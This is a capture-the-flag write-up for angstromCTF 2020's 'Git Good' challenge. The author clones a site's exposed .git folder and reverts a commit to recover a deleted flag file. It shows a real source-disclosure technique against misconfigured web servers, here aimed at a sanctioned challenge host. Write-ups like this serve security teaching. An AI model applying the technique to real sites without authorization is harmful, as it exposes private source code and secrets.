# Git Good

## Challenge Overview

Did you know that angstrom has a git repo for all the challenges? I noticed that clam committed [a very work in progress challenge](https://gitgood.2020.chall.actf.co) so I thought it was worth sharing.

## Solution

From the name of the challenge, I guessed the challenge was based on GitHub. So I did a quick Google search and found the following article. 
https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html

I then fired up my terminal and did a git clone.

git clone "https://gitgood.2020.chall.actf.co/.git"

The cloned repository had the following files:

    index.html  index.js  package.json  package-lock.json  thisistheflag.txt

The "thisistheflag.txt" file said that the flag was removed in a previous commit. I had to revert to its previous commit. 

    $ git log
    commit e975d678f209da09fff763cd297a6ed8dd77bb35
    (HEAD -> master, origin/master, origin/HEAD)
    Author: aplet123 <noneof@your.business>
    Date:   Sat Mar 7 16:27:44 2020 +0000 

    Initial commit
    commit 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
    Author: aplet123 <noneof@your.business>
    Date:   Sat Mar 7 16:27:24 2020 +0000

    haha I lied this is the actual initial commit

    
So, I rolled back to the previous commit using

    git revert e975d678f209da09fff763cd297a6ed8dd77bb35
    cat thisistheflag.txt 

Flag: actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}

